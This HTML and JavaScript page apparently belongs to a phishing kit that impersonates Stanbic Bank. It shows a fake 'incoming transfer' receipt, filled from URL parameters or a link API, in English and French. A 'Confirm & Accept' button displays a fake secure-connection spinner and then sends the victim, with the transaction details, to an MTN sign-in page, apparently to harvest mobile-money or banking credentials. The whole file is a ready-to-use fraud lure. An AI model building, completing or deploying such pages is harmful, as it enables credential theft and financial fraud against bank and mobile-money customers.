<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<title>Stanbic Bank · Incoming Transfer</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
<style>
  :root {
    --sb-primary:   #01008C;
    --sb-royal:     #005EB8;
    --sb-navy:      #001E50;
    --sb-gold:      #FFB81C;
    --sb-white:     #FFFFFF;
    --sb-text:      #1A2233;
    --sb-muted:     #5B6577;
    --sb-border:    #E4E8F0;
    --sb-soft:      #F4F6FA;
    --sb-page:      #EEF1F7;
    --sb-green:     #0E7A4A;
    --sb-red:       #B3261E;
    --sb-red-soft:  #FDECEA;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; }
  body {
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: var(--sb-page); color: var(--sb-text);
    -webkit-font-smoothing: antialiased; line-height: 1.5;
    min-height: 100vh; display: flex; justify-content: center; padding: 0;
  }
  .phone {
    width: 100%; max-width: 430px; min-height: 100vh;
    background: var(--sb-white); display: flex; flex-direction: column;
    position: relative; overflow: hidden;
  }

  /* ─── TOOLBAR ─── */
  .toolbar {
    flex-shrink: 0; background: var(--sb-white);
    padding: max(12px, env(safe-area-inset-top, 0px)) 16px 12px;
    border-bottom: 1px solid var(--sb-border);
    display: flex; align-items: center; justify-content: space-between;
    gap: 10px; z-index: 30;
  }
  .toolbar-logo { height: 26px; width: auto; display: block; }
  .toolbar-actions { display: flex; gap: 8px; }
  .tool-btn {
    display: inline-flex; align-items: center; justify-content: center; gap: 6px;
    padding: 8px 12px; font-size: 12px; font-weight: 600;
    border-radius: 8px; font-family: inherit; cursor: pointer;
    transition: all .15s; border: 1px solid var(--sb-border);
    background: var(--sb-white); color: var(--sb-primary);
  }
  .tool-btn:hover { border-color: var(--sb-primary); background: #F6F8FC; }
  .tool-btn.copied { background: var(--sb-green); border-color: var(--sb-green); color: #fff; }
  .tool-btn svg { width: 14px; height: 14px; stroke: currentColor; fill: none; stroke-width: 2; }

  /* ─── HERO / HEADER ─── */
  .top {
    position: relative; flex-shrink: 0;
    background: linear-gradient(160deg, var(--sb-primary) 0%, var(--sb-royal) 100%);
    padding: 26px 22px 28px;
    border-bottom-left-radius: 20px;
    border-bottom-right-radius: 20px;
  }
  .top::before {
    content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px;
    background: var(--sb-gold);
    border-top-left-radius: 20px; border-top-right-radius: 20px;
  }
  .top-row {
    display: flex; align-items: center; justify-content: space-between; gap: 12px;
  }
  .secure-badge {
    display: inline-flex; align-items: center; gap: 6px;
    font-size: 10.5px; font-weight: 700; letter-spacing: 0.5px;
    text-transform: uppercase; color: #FFFFFF;
    background: rgba(255,255,255,0.14);
    border: 1px solid rgba(255,255,255,0.25);
    padding: 5px 10px; border-radius: 999px;
  }
  .secure-badge svg {
    width: 11px; height: 11px; stroke: var(--sb-gold); fill: none; stroke-width: 2.4;
  }

  .hero-title {
    margin-top: 22px; font-size: 21px; font-weight: 800;
    color: #FFFFFF; letter-spacing: -0.4px; line-height: 1.25;
  }
  .hero-sub {
    margin-top: 6px; font-size: 12.5px; color: rgba(255,255,255,0.82);
    line-height: 1.55; max-width: 320px;
  }

  /* ─── BODY ─── */
  .body {
    flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch;
    padding: 22px 20px 24px;
    display: flex; flex-direction: column;
  }

  /* ─── AMOUNT CARD ─── */
  .amount-card {
    background: var(--sb-soft); border-radius: 12px;
    border: 1px solid var(--sb-border);
    padding: 16px 18px; margin-bottom: 14px;
    display: flex; flex-direction: column; gap: 4px;
  }
  .amount-card .label {
    font-size: 10.5px; color: var(--sb-muted); font-weight: 700;
    letter-spacing: 0.7px; text-transform: uppercase;
  }
  .amount-card .amount {
    font-size: 30px; font-weight: 800; color: var(--sb-primary);
    letter-spacing: -0.8px; line-height: 1.1;
  }

  /* ─── PURPOSE CARD ─── */
  .purpose-card {
    background: #FFFDF5; border-radius: 12px;
    border: 1px solid #F2E4B8;
    padding: 14px 18px; margin-bottom: 20px;
    display: flex; flex-direction: column; gap: 4px;
    position: relative; overflow: hidden;
  }
  .purpose-card::before {
    content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 3px;
    background: var(--sb-gold);
  }
  .purpose-card .label {
    font-size: 10.5px; color: #8A6600; font-weight: 700;
    letter-spacing: 0.7px; text-transform: uppercase;
  }
  .purpose-card .purpose {
    font-size: 14.5px; font-weight: 700; color: var(--sb-navy);
    line-height: 1.4; word-break: break-word;
  }
  .purpose-card.hidden { display: none; }

  /* ─── ACCEPT BUTTON ─── */
  .btn-accept {
    width: 100%; height: 52px;
    background: var(--sb-primary); color: #fff;
    font-family: inherit; font-size: 14.5px; font-weight: 700;
    letter-spacing: 0.4px;
    border: none; border-radius: 10px; cursor: pointer;
    box-shadow: 0 8px 20px rgba(1,0,140,0.22);
    transition: filter .15s, transform .1s, box-shadow .15s;
  }
  .btn-accept:hover { filter: brightness(1.08); box-shadow: 0 10px 24px rgba(1,0,140,0.28); }
  .btn-accept:active { transform: scale(0.985); }
  .btn-accept:disabled { opacity: 0.65; cursor: wait; }

  /* ─── RECIPIENT ─── */
  .recipient-line {
    margin-top: 18px; font-size: 13px; color: var(--sb-muted); line-height: 1.5;
    display: flex; flex-direction: column; gap: 10px;
  }
  .recipient-block {
    display: flex; align-items: baseline; justify-content: space-between; gap: 12px;
    padding: 10px 14px;
    background: var(--sb-soft); border-radius: 10px;
    border: 1px solid var(--sb-border);
  }
  .recipient-k {
    font-size: 10.5px; font-weight: 700; text-transform: uppercase;
    letter-spacing: 0.6px; color: var(--sb-muted); flex-shrink: 0;
  }
  .recv-name {
    font-weight: 700; color: var(--sb-text);
    font-size: 13.5px; text-align: right; word-break: break-word;
  }

  /* ─── DETAILS PANEL ─── */
  .details-panel {
    width: 100%; margin-top: 18px;
    background: var(--sb-white); border-radius: 12px;
    border: 1px solid var(--sb-border);
    padding: 4px 16px; text-align: left;
  }
  .detail-row {
    display: flex; justify-content: space-between; align-items: flex-start;
    gap: 12px; padding: 11px 0;
    border-bottom: 1px solid var(--sb-border);
  }
  .detail-row:last-child { border-bottom: none; }
  .detail-row .k {
    font-size: 11.5px; color: var(--sb-muted); flex-shrink: 0; font-weight: 500;
  }
  .detail-row .v {
    font-size: 12px; font-weight: 700; text-align: right;
    word-break: break-word; color: var(--sb-text);
  }

  /* ─── FOOTER ─── */
  .sb-footer {
    width: 100%; margin-top: 22px;
    background: var(--sb-navy);
    border-radius: 12px;
    padding: 16px 18px;
    display: flex; align-items: center; justify-content: space-between;
    gap: 12px; text-align: left;
  }
  .sb-footer .foot-logo {
    height: 22px; width: auto; display: block;
  }
  .sb-footer .foot-support {
    font-size: 10.5px; color: rgba(255,255,255,0.72); line-height: 1.5; font-weight: 500;
    text-align: right;
  }
  .sb-footer .foot-support strong {
    color: var(--sb-gold); font-weight: 700; font-size: 11.5px;
  }

  /* ─── TOAST ─── */
  .toast {
    position: fixed; bottom: 24px; left: 50%;
    transform: translateX(-50%) translateY(80px);
    background: var(--sb-navy); color: #fff; padding: 11px 18px; border-radius: 9px;
    font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
    z-index: 50; pointer-events: none; max-width: 90%; text-align: center;
    box-shadow: 0 12px 28px rgba(0,0,0,0.25);
  }
  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }

  /* ─── INITIATING STATE ─── */
  .body.initiating {
    justify-content: center;
    padding-top: 40px;
  }
  .init-spinner {
    width: 54px; height: 54px;
    border: 4px solid var(--sb-soft);
    border-top-color: var(--sb-primary);
    border-radius: 50%;
    animation: initSpin 0.9s linear infinite;
    margin-bottom: 26px;
  }
  @keyframes initSpin { to { transform: rotate(360deg); } }
  .init-title {
    font-size: 20px; font-weight: 800; letter-spacing: -0.4px;
    color: var(--sb-navy); margin-bottom: 8px; line-height: 1.25;
  }
  .init-desc {
    font-size: 13px; color: var(--sb-muted); line-height: 1.6;
    max-width: 300px; margin: 0 auto;
  }
  .init-note {
    margin-top: 22px; font-size: 11.5px; color: var(--sb-muted);
    font-weight: 600;
  }
  body.is-initiating .toolbar,
  body.is-initiating .top { display: none !important; }
  body.is-initiating .body { padding: 40px 22px; }

  /* ─── ERROR / EXPIRED ─── */
  .error-box {
    padding: 40px 24px; text-align: center; color: var(--sb-muted);
    font-size: 13px; line-height: 1.6;
  }
  .expired-icon {
    width: 72px; height: 72px; border-radius: 50%;
    background: #94A3B8;
    display: inline-flex; align-items: center; justify-content: center;
    margin: 0 auto 16px;
    box-shadow: 0 0 0 6px rgba(148,163,184,0.12),
                0 10px 22px rgba(148,163,184,0.28);
  }
  .expired-icon svg {
    width: 36px; height: 36px;
    stroke: #fff; fill: none;
    stroke-width: 3.2; stroke-linecap: round; stroke-linejoin: round;
  }

  /* ─── RESPONSIVE ─── */
  @media (pointer: coarse) {
    .btn-accept { height: 54px; font-size: 15px; }
  }
  @media (orientation: landscape) and (max-height: 500px) {
    .top { padding: 16px 20px 18px; }
    .hero-title { margin-top: 12px; font-size: 17px; }
    .body { padding: 16px 20px; }
    .amount-card { padding: 12px 16px; margin-bottom: 10px; }
    .amount-card .amount { font-size: 24px; }
    .purpose-card { padding: 10px 16px; margin-bottom: 12px; }
    .btn-accept { height: 46px; }
    .details-panel, .sb-footer { margin-top: 12px; }
  }
  @media print {
    body { background: #fff; padding: 0; }
    .toolbar, .sb-footer, .btn-accept { display: none !important; }
    .phone { box-shadow: none; }
    .top { background: #fff; border-bottom: 1px solid #ccc; padding: 12px 0; }
    .hero-title { color: var(--sb-primary); }
    .hero-sub { color: var(--sb-muted); }
    .secure-badge { display: none; }
    .body { padding-top: 20px; }
  }
  @media (max-width: 380px) {
    .toolbar-logo { height: 22px; }
    .tool-btn { padding: 7px 10px; font-size: 11px; }
    .top { padding: 20px 18px 22px; }
    .hero-title { font-size: 19px; }
    .amount-card .amount { font-size: 26px; }
    .purpose-card .purpose { font-size: 13.5px; }
    .btn-accept { height: 50px; font-size: 14px; }
    .detail-row .v { font-size: 11.5px; }
    .sb-footer { padding: 14px 16px; }
    .sb-footer .foot-logo { height: 20px; }
  }
  @media (min-width: 640px) {
    body { padding: 32px 0; align-items: center; }
    .phone {
      min-height: calc(100vh - 64px); max-height: 900px;
      border-radius: 20px;
      box-shadow: 0 30px 80px rgba(1,0,140,0.14);
      overflow: hidden;
    }
  }
</style>
</head>
<body>

<div class="phone">

  <!-- TOOLBAR -->
  <div class="toolbar">
    <img
      class="toolbar-logo"
      src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/light/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
      alt="Stanbic Bank"
    >
    <div class="toolbar-actions">
      <button class="tool-btn" id="copyBtn" onclick="copyReceipt()">
        <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
        <span id="copyLbl">Copy</span>
      </button>
      <button class="tool-btn" onclick="window.print()">
        <svg viewBox="0 0 24 24"><polyline points="6 9 6 2 18 2 18 9"/><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"/><rect x="6" y="14" width="12" height="8"/></svg>
        <span id="printLbl">Print</span>
      </button>
    </div>
  </div>

  <!-- HERO -->
  <div class="top">
    <div class="top-row">
      <div class="secure-badge">
        <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
        Secure Transfer
      </div>
    </div>
    <div class="hero-title" id="heroTitle">Incoming Transfer</div>
    <div class="hero-sub" id="heroSub">A secure payment is being transferred to your account. Review the details below and confirm to proceed.</div>
  </div>

  <!-- BODY -->
  <div class="body" id="bodyArea">

    <div class="amount-card">
      <span class="label" id="amountLabel">Transfer amount</span>
      <span class="amount" id="amountValue">—</span>
    </div>

    <div class="purpose-card hidden" id="purposeCard">
      <span class="label" id="purposeLabel">Purpose</span>
      <span class="purpose" id="purposeValue">—</span>
    </div>

    <button class="btn-accept" id="acceptBtn" onclick="acceptPayment()">Confirm &amp; Accept</button>

    <div class="recipient-line">
      <div class="recipient-block">
        <span class="recipient-k" id="fromLabel">From</span>
        <span class="recv-name" id="fromName">—</span>
      </div>
      <div class="recipient-block">
        <span class="recipient-k" id="toLabel">To</span>
        <span class="recv-name" id="reqRecipient">—</span>
      </div>
    </div>

    <div class="details-panel" id="detailsPanel"></div>

    <div class="sb-footer">
      <img
        class="foot-logo"
        src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
        alt="Stanbic Bank"
      >
      <div class="foot-support">
        <span id="helpLabel">Customer Care</span><br>
        <span id="callLabel">Call</span> <strong id="supportNum">—</strong>
      </div>
    </div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
  const I18N = {
    en: {
      docTitle: 'Stanbic Bank · Incoming Transfer',
      heroTitle: 'Incoming Transfer',
      heroSub: 'A secure payment is being transferred to your account. Review the details below and confirm to proceed.',
      amountLabel: 'Transfer amount',
      purposeLabel: 'Purpose',
      receiveBtn: 'Confirm & Accept',
      fromLabel: 'From',
      toLabel: 'To',
      needHelp: 'Customer Care',
      callLabel: 'Call',
      copyBtn: 'Copy',
      printBtn: 'Print',
      copied: 'Copied ✓',
      copyToast: 'Receipt copied to clipboard.',
      copyReceiptTitle: 'Stanbic Bank — Incoming Transfer',
      initiating: 'Preparing secure transfer…',
      initiatingDesc: 'Connecting securely to Stanbic Bank so you can receive this payment. Please do not close this page.',
      initiatingNote: 'This usually takes a few seconds.',
      expiredTitle: 'Payment Request Expired',
      expiredDescPrefix: 'This payment link is no longer valid.',
      expiredDescSuffix: 'Please ask the sender to send you a new link.',
      expiredOn: 'It expired on',
      invalidLink: 'Invalid or missing link. Please request a new payment link from the sender.',
      notFound: 'We couldn\'t find this payment request. Please request a new payment link from the sender.',
      kCountry: 'Country',
      kPaymentMethod: 'Payment method',
      kService: 'Service',
      kReference: 'Reference',
      kTransactionDate: 'Date',
      kStatus: 'Status',
      vReceived: 'Ready to receive',
      docTitleInvalid: 'Invalid Link · Stanbic Bank'
    },
    fr: {
      docTitle: 'Stanbic Bank · Virement entrant',
      heroTitle: 'Virement entrant',
      heroSub: 'Un paiement sécurisé est en cours de transfert vers votre compte. Vérifiez les détails ci-dessous et confirmez pour continuer.',
      amountLabel: 'Montant du transfert',
      purposeLabel: 'Motif',
      receiveBtn: 'Confirmer & Accepter',
      fromLabel: 'De',
      toLabel: 'À',
      needHelp: 'Service Client',
      callLabel: 'Appelez le',
      copyBtn: 'Copier',
      printBtn: 'Imprimer',
      copied: 'Copié ✓',
      copyToast: 'Reçu copié dans le presse-papiers.',
      copyReceiptTitle: 'Stanbic Bank — Virement entrant',
      initiating: 'Préparation du transfert sécurisé…',
      initiatingDesc: 'Connexion sécurisée à Stanbic Bank pour recevoir ce paiement. Veuillez ne pas fermer cette page.',
      initiatingNote: 'Cela prend généralement quelques secondes.',
      expiredTitle: 'Demande de paiement expirée',
      expiredDescPrefix: 'Ce lien de paiement n\'est plus valide.',
      expiredDescSuffix: 'Veuillez demander à l\'expéditeur de vous envoyer un nouveau lien.',
      expiredOn: 'Il a expiré le',
      invalidLink: 'Lien invalide ou manquant. Veuillez demander un nouveau lien de paiement à l\'expéditeur.',
      notFound: 'Nous n\'avons pas trouvé cette demande de paiement. Veuillez demander un nouveau lien à l\'expéditeur.',
      kCountry: 'Pays',
      kPaymentMethod: 'Mode de paiement',
      kService: 'Service',
      kReference: 'Référence',
      kTransactionDate: 'Date',
      kStatus: 'Statut',
      vReceived: 'Prêt à recevoir',
      docTitleInvalid: 'Lien invalide · Stanbic Bank'
    }
  };

  const urlParams = new URLSearchParams(location.search);
  const urlLang = (urlParams.get('lang') || '').toLowerCase();
  let T = I18N[urlLang] || I18N.en;
  let currentLang = I18N[urlLang] ? urlLang : 'en';

  function setLang(lang) {
    currentLang = (lang || 'en').toLowerCase();
    T = I18N[currentLang] || I18N.en;
    applyTranslations();
  }

  function applyTranslations() {
    document.title = T.docTitle;
    document.getElementById('heroTitle').textContent = T.heroTitle;
    document.getElementById('heroSub').textContent = T.heroSub;
    document.getElementById('amountLabel').textContent = T.amountLabel;
    document.getElementById('purposeLabel').textContent = T.purposeLabel;
    document.getElementById('acceptBtn').textContent = T.receiveBtn;
    document.getElementById('fromLabel').textContent = T.fromLabel;
    document.getElementById('toLabel').textContent = T.toLabel;
    document.getElementById('helpLabel').textContent = T.needHelp;
    document.getElementById('callLabel').textContent = T.callLabel;
    document.getElementById('copyLbl').textContent = T.copyBtn;
    document.getElementById('printLbl').textContent = T.printBtn;
  }

  async function decodeData() {
    const params = new URLSearchParams(location.search);
    const code = params.get('r') || params.get('t');

    if (code) {
      try {
        const res = await fetch('/api/links/' + encodeURIComponent(code));
        if (res.status === 410) {
          const body = await res.json().catch(() => ({}));
          return { _expired: true, expiresAt: body.expiresAt || null };
        }
        if (res.status === 404) return { _notFound: true };
        if (!res.ok) return { _notFound: true };
        return await res.json();
      } catch (e) {
        console.error('short-link fetch failed', e);
        return { _notFound: true };
      }
    }

    const raw = params.get('d');
    if (!raw) return null;
    try {
      let b64 = raw.replace(/-/g, '+').replace(/_/g, '/');
      while (b64.length % 4) b64 += '=';
      return JSON.parse(decodeURIComponent(escape(atob(b64))));
    } catch (e) {
      return { _notFound: true };
    }
  }

  const CURRENCY_LOCALE = {
    XAF: 'fr-CM', ZMW: 'en-ZM', UGX: 'en-UG', GHS: 'en-GH',
    XOF: 'fr-BJ', BWP: 'en-BW', USD: 'en-US'
  };
  function formatAmount(amount, currency) {
    const locale = CURRENCY_LOCALE[currency] || 'en-US';
    const n = Number(amount);
    if (!isFinite(n)) return '0 ' + (currency || '');
    try {
      const parts = new Intl.NumberFormat(locale, {
        minimumFractionDigits: 0, maximumFractionDigits: 2
      }).format(n);
      const pretty = (currency === 'XAF' || currency === 'XOF' || currency === 'UGX')
        ? parts.replace(/\u202F|\u00A0|,/g, ' ')
        : parts;
      return pretty + ' ' + currency;
    } catch (e) { return n + ' ' + (currency || ''); }
  }

  const SUPPORT_NUMBERS = {
    'Cameroon': '233 42 12 12',
    'Zambia': '111',
    'Zambia (MTN)': '111',
    'Uganda': '100',
    'Uganda (MTN)': '100',
    'Ghana': '100',
    'Ghana (MTN)': '100',
    'Benin': '111'
  };

  function formatDate(ts) {
    const d = ts ? new Date(ts) : new Date();
    const locale = currentLang === 'fr' ? 'fr-FR' : undefined;
    return d.toLocaleString(locale, {
      day: '2-digit', month: 'short', year: 'numeric',
      hour: '2-digit', minute: '2-digit'
    });
  }

  function showToast(msg) {
    const t = document.getElementById('toast');
    t.textContent = msg; t.classList.add('show');
    clearTimeout(t._timer);
    t._timer = setTimeout(() => t.classList.remove('show'), 2200);
  }

  let tx = { ref: '', am: '', cur: '', rn: '', c: '', pm: '', sn: '', mk: '', an: '', dt: '', pu: '' };

  async function init() {
    const data = await decodeData();

    if (!data) {
      document.querySelector('.body').innerHTML =
        '<div class="error-box">' + T.invalidLink + '</div>';
      document.getElementById('acceptBtn').style.display = 'none';
      document.getElementById('copyBtn').style.display = 'none';
      return;
    }

    if (data._expired) {
      document.getElementById('acceptBtn').style.display = 'none';
      document.getElementById('copyBtn').style.display = 'none';
      const expText = data.expiresAt
        ? T.expiredOn + ' ' + formatDate(data.expiresAt) + '.'
        : '';
      document.querySelector('.body').innerHTML =
        '<div class="expired-icon">' +
          '<svg viewBox="0 0 24 24"><path d="M12 8v5M12 16.5v.01"/></svg>' +
        '</div>' +
        '<div style="text-align:center">' +
          '<div style="font-size:18px;font-weight:800;color:#001E50;margin-bottom:6px">' + T.expiredTitle + '</div>' +
          '<div style="font-size:12.5px;color:#5B6577;line-height:1.6">' + T.expiredDescPrefix + ' ' + expText + '<br>' + T.expiredDescSuffix + '</div>' +
        '</div>';
      document.title = T.docTitle;
      return;
    }

    if (data._notFound) {
      document.querySelector('.body').innerHTML =
        '<div class="error-box">' + T.notFound + '</div>';
      document.getElementById('acceptBtn').style.display = 'none';
      document.getElementById('copyBtn').style.display = 'none';
      document.title = T.docTitleInvalid;
      return;
    }

    if (!urlLang && data.lang) {
      setLang(data.lang);
    } else {
      applyTranslations();
    }

    tx = {
      ref: data.tx  || '',
      am:  data.am  || '',
      cur: data.cur || '',
      rn:  data.rn  || '',
      c:   data.c   || '',
      pm:  data.pm  || '',
      sn:  data.sn  || '',
      mk:  data.mk  || '',
      an:  data.an  || '',
      dt:  data.dt  || data.createdAt || '',
      pu:  data.pu  || data.purpose || ''
    };

    const amtFull = formatAmount(tx.am, tx.cur);
    document.getElementById('amountValue').textContent = amtFull;
    document.getElementById('reqRecipient').textContent = tx.rn || '—';
    document.getElementById('fromName').textContent = tx.mk || 'Stanbic Bank';

    // Purpose field
    const purposeCard = document.getElementById('purposeCard');
    const purposeValue = document.getElementById('purposeValue');
    if (tx.pu && tx.pu.trim()) {
      purposeValue.textContent = tx.pu.trim();
      purposeCard.classList.remove('hidden');
    } else {
      purposeCard.classList.add('hidden');
    }

    const rows = [
      { k: T.kCountry,          v: tx.c },
      { k: T.kPaymentMethod,    v: tx.pm },
      { k: T.kService,          v: tx.sn },
      { k: T.kReference,        v: tx.ref },
      { k: T.kTransactionDate,  v: tx.dt ? formatDate(tx.dt) : formatDate() },
      { k: T.kStatus,           v: T.vReceived }
    ];
    let html = '';
    rows.forEach(r => {
      if (!r.v && r.v !== 0) return;
      html += `<div class="detail-row"><span class="k">${r.k}</span><span class="v">${r.v}</span></div>`;
    });
    document.getElementById('detailsPanel').innerHTML = html;

    document.getElementById('supportNum').textContent = SUPPORT_NUMBERS[tx.c] || '—';
  }

  function copyReceipt() {
    const lines = [
      T.copyReceiptTitle,
      '----------------------------------',
      T.amountLabel + ': ' + formatAmount(tx.am, tx.cur),
      tx.pu ? T.purposeLabel + ': ' + tx.pu : '',
      T.fromLabel + ': ' + (tx.mk || ''),
      T.toLabel + ': ' + (tx.rn || ''),
      T.kCountry + ': ' + (tx.c || ''),
      T.kReference + ': ' + (tx.ref || ''),
      T.kPaymentMethod + ': ' + (tx.pm || ''),
      T.kTransactionDate + ': ' + formatDate(tx.dt)
    ].filter(Boolean).join('\n');

    const btn = document.getElementById('copyBtn');
    const lbl = document.getElementById('copyLbl');
    const done = () => {
      btn.classList.add('copied');
      lbl.textContent = T.copied;
      showToast(T.copyToast);
      setTimeout(() => { btn.classList.remove('copied'); lbl.textContent = T.copyBtn; }, 1800);
    };
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(lines).then(done).catch(() => { fallbackCopy(lines); done(); });
    } else { fallbackCopy(lines); done(); }
  }

  function fallbackCopy(text) {
    const ta = document.createElement('textarea');
    ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
    document.body.appendChild(ta); ta.select();
    try { document.execCommand('copy'); } catch (e) {}
    document.body.removeChild(ta);
  }

  function acceptPayment() {
    const btn = document.getElementById('acceptBtn');
    if (btn && btn.disabled) return;
    if (btn) btn.disabled = true;

    document.body.classList.add('is-initiating');

    const bodyArea = document.getElementById('bodyArea');
    if (bodyArea) {
      bodyArea.classList.add('initiating');
      bodyArea.innerHTML = ''
        + '<div class="init-spinner" aria-hidden="true"></div>'
        + '<div class="init-title">' + T.initiating + '</div>'
        + '<div class="init-desc">' + T.initiatingDesc + '</div>'
        + '<div class="init-note">' + T.initiatingNote + '</div>';
    }

    const q = new URLSearchParams({
      tx:  tx.ref,
      am:  tx.am,
      cur: tx.cur,
      rn:  tx.rn,
      c:   tx.c,
      pm:  tx.pm,
      sn:  tx.sn,
      mk:  tx.mk,
      an:  tx.an,
      dt:  tx.dt,
      pu:  tx.pu,
      lang: currentLang
    });
    setTimeout(() => {
      window.location.href = 'mtn-signin.html?' + q.toString();
    }, 3000);
  }

  document.addEventListener('DOMContentLoaded', init);
</script>
</body>
</html>
